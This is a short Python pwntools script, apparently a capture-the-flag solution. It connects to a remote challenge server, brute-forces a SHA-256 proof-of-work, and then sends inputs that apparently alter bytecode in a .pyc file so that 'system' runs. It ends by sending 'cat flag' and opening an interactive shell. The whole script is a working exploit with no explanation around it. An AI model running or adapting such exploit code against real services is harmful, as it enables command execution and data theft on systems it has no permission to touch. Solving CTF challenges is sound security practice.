from pwn import *
import hashlib

r=remote("18.205.38.120",10122)
## pow

temp=r.recvuntil("sha256( ")
prefix=r.recvline().split()[0]
i=0
while True:
  data=prefix+str(i)
  Hash=hashlib.sha256(data)
  if Hash.hexdigest()[:5]=="0"*5:
    r.sendline(str(i))
    break
  i+=1

## get flag

r.sendline("0")
r.sendline("system")
r.sendline("1")
r.sendline("nonsecret.pyc")
r.sendline("b013")
r.sendline("92")
r.sendline("3")
r.sendline("cat flag")
r.interactive()
